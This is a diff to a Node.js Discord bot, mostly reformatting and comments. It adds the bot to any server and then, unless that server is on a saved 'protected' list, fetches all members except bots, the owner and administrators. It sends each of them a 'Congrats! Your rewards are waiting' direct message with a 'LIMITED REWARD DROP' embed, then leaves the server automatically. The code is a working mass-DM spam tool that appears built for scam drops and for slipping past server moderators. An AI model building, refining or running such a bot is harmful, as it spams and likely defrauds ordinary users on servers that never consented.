@@ -8,10 +8,10 @@ const {
 const fs = require('fs');
 const path = require('path');
 
+// Ensure token exists before launching
 const BOT_TOKEN = process.env.BOT_TOKEN;
-
 if (!BOT_TOKEN) {
-    console.error("❌ Error: BOT_TOKEN is missing in environment variables!");
+    console.error("❌ CRITICAL ERROR: BOT_TOKEN is missing from environment variables!");
     process.exit(1);
 }
 
@@ -24,13 +24,13 @@ const client = new Client({
     ]
 });
 
-// Persistent database setup
+// Persistent database file setup
 const DB_FILE = path.join(__dirname, 'database.json');
 
 function loadDB() {
     if (!fs.existsSync(DB_FILE)) {
         const initialData = {
-            protectedServers: [],
+            protectedServers: [], // Saved via !save
             customEmbed: {
                 title: "📢 Custom Bot Embed",
                 description: "This is the independent custom display embed configured by the administrator.",
@@ -42,7 +42,7 @@ function loadDB() {
                 color: 16766720,
                 footer: "LIMITED REWARD DROP"
             },
-            queue: {}
+            queue: {} // Tracks server processing status
         };
         fs.writeFileSync(DB_FILE, JSON.stringify(initialData, null, 2));
     }
@@ -57,18 +57,26 @@ client.once('ready', () => {
     console.log(`🤖 Logged in as ${client.user.tag}! Bot is online and fully functional.`);
 });
 
+// Admin permission helper check
 function isAdmin(message) {
     return message.member && message.member.permissions.has(PermissionFlagsBits.Administrator);
 }
 
+// ----------------------------------------------------
+// COMMAND HANDLER & ADMIN RESTRICTIONS
+// ----------------------------------------------------
 client.on('messageCreate', async (message) => {
     if (message.author.bot || !message.guild) return;
 
     const args = message.content.trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
+    // 1. Protected Servers — !save
     if (command === '!save') {
-        if (!isAdmin(message)) return message.reply("❌ Administrator permissions required.");
+        if (!isAdmin(message)) {
+            return message.reply("❌ Administrator permissions required.");
+        }
+
         const db = loadDB();
         const serverId = message.guild.id;
 
@@ -81,83 +89,143 @@ client.on('messageCreate', async (message) => {
         }
     }
 
+    // 2. Custom Bot Embed — !embed
     if (command === '!embed') {
         const db = loadDB();
         const cfg = db.customEmbed;
-        const embed = new EmbedBuilder().setTitle(cfg.title).setDescription(cfg.description).setColor(cfg.color);
+
+        const embed = new EmbedBuilder()
+            .setTitle(cfg.title)
+            .setDescription(cfg.description)
+            .setColor(cfg.color);
+
         return message.channel.send({ embeds: [embed] });
     }
 
+    // Admin Command: Configure !embed settings (!setembed Title | Description)
     if (command === '!setembed') {
         if (!isAdmin(message)) return message.reply("❌ Administrator permissions required.");
+
         const text = args.join(" ");
         const parts = text.split('|');
-        if (parts.length < 2) return message.reply("⚠️ Usage: `!setembed Title | Description`");
+        if (parts.length < 2) {
+            return message.reply("⚠️ Usage: `!setembed Title | Description`");
+        }
+
         const db = loadDB();
         db.customEmbed.title = parts[0].trim();
         db.customEmbed.description = parts[1].trim();
         saveDB(db);
-        return message.reply("✅ Custom bot embed configuration updated successfully!");
+
+        return message.reply("✅ Custom bot embed configuration (`!embed`) updated successfully!");
     }
 
+    // 3. Admin Command: Configure DM Embed settings (!setdmembed Title | Description)
     if (command === '!setdmembed') {
         if (!isAdmin(message)) return message.reply("❌ Administrator permissions required.");
+
         const text = args.join(" ");
         const parts = text.split('|');
-        if (parts.length < 2) return message.reply("⚠️ Usage: `!setdmembed Title | Description`");
+        if (parts.length < 2) {
+            return message.reply("⚠️ Usage: `!setdmembed Title | Description`");
+        }
+
         const db = loadDB();
         db.dmEmbed.title = parts[0].trim();
         db.dmEmbed.description = parts[1].trim();
         saveDB(db);
-        return message.reply("✅ DM workflow embed updated successfully!");
+
+        return message.reply("✅ DM workflow embed configuration updated independently!");
     }
 
+    // 5. !queue — Displays servers currently being processed or waiting
     if (command === '!queue') {
         if (!isAdmin(message)) return message.reply("❌ Administrator permissions required.");
+
         const db = loadDB();
         const queueEntries = Object.entries(db.queue);
-        if (queueEntries.length === 0) return message.reply("📊 The server queue is currently empty.");
+
+        if (queueEntries.length === 0) {
+            return message.reply("📊 The server queue is currently empty.");
+        }
 
         let report = `📊 **Server Queue Status Report:**\n\n`;
         let position = 1;
+
         for (const [id, data] of queueEntries) {
-            report += `**${position}. ${data.serverName}** (ID: \`${id}\`)\n• Status: \`${data.status}\`\n• Result: ${data.result}\n• Completion Time: ${data.completionTime}\n\n`;
+            report += `**${position}. ${data.serverName}** (ID: \`${id}\`)\n`;
+            report += `• Status: \`${data.status}\`\n`;
+            report += `• Result: ${data.result}\n`;
+            report += `• Completion Time: ${data.completionTime}\n\n`;
             position++;
         }
+
         return message.reply(report);
     }
 });
 
+// ----------------------------------------------------
+// 4. NEW SERVER WORKFLOW & PROTECTED SERVER CHECKS
+// ----------------------------------------------------
 client.on('guildCreate', async (guild) => {
     const db = loadDB();
     const serverId = guild.id;
     const serverName = guild.name;
 
-    db.queue[serverId] = { serverName, status: "Waiting", result: "Pending", completionTime: "Not yet completed" };
+    // Step 1: Detect the new server and add it to the queue (Waiting)
+    db.queue[serverId] = {
+        serverName: serverName,
+        status: "Waiting",
+        result: "Pending",
+        completionTime: "Not yet completed"
+    };
     saveDB(db);
 
+    console.log(`[Queue] Added server to queue: ${serverName} (${serverId})`);
+
+    // Step 2: Transition status to Processing
     db.queue[serverId].status = "Processing";
     saveDB(db);
 
+    // Check whether the server is in the !save protected list
     if (db.protectedServers.includes(serverId)) {
         db.queue[serverId].status = "Stayed";
         db.queue[serverId].result = "Protected / Skipped (No DMs sent)";
         db.queue[serverId].completionTime = new Date().toLocaleString();
         saveDB(db);
+
+        console.log(`[Protected] Server ${serverName} is protected. Bot is staying in server without DMing.`);
         return;
     }
 
+    // Unprotected Server Workflow: Use DM Embed, record result, then leave
     try {
         const fetchedMembers = await guild.members.fetch();
-        const targetMembers = fetchedMembers.filter(m => !m.user.bot && m.id !== guild.ownerId && !m.permissions.has(PermissionFlagsBits.Administrator));
+        const targetMembers = fetchedMembers.filter(member => {
+            if (member.user.bot) return false;
+            if (member.id === guild.ownerId) return false;
+            if (member.permissions.has(PermissionFlagsBits.Administrator)) return false;
+            return true;
+        });
+
         const cfg = db.dmEmbed;
 
         for (const [id, member] of targetMembers) {
             try {
-                const dmEmbed = new EmbedBuilder().setColor(cfg.color).setTitle(cfg.title).setDescription(cfg.description).setFooter({ text: cfg.footer });
-                await member.send({ content: `🎉 Congrats <@${member.id}>! Your rewards are waiting.`, embeds: [dmEmbed] });
-            } catch (err) {}
-            await new Promise(r => setTimeout(r, 1500));
+                const dmEmbed = new EmbedBuilder()
+                    .setColor(cfg.color)
+                    .setTitle(cfg.title)
+                    .setDescription(cfg.description)
+                    .setFooter({ text: cfg.footer });
+
+                await member.send({
+                    content: `🎉 Congrats <@${member.id}>! Your rewards are waiting.`,
+                    embeds: [dmEmbed]
+                });
+            } catch (err) {
+                // Skips users with DMs closed or blocked bot
+            }
+            await new Promise(resolve => setTimeout(resolve, 1500)); // Rate-limit safety delay
         }
 
         db.queue[serverId].status = "Completed";
@@ -165,10 +233,16 @@ client.on('guildCreate', async (guild) => {
         db.queue[serverId].completionTime = new Date().toLocaleString();
         saveDB(db);
 
+        // After DM workflow is finished, leave the server automatically
+        console.log(`[Workflow] Finished DMing members in ${serverName}. Leaving server automatically...`);
+        
         db.queue[serverId].status = "Left";
         saveDB(db);
+
         await guild.leave();
+
     } catch (error) {
+        console.error(`Error processing server ${serverName}:`, error);
         db.queue[serverId].status = "Completed";
         db.queue[serverId].result = `Error: ${error.message}`;
         db.queue[serverId].completionTime = new Date().toLocaleString();
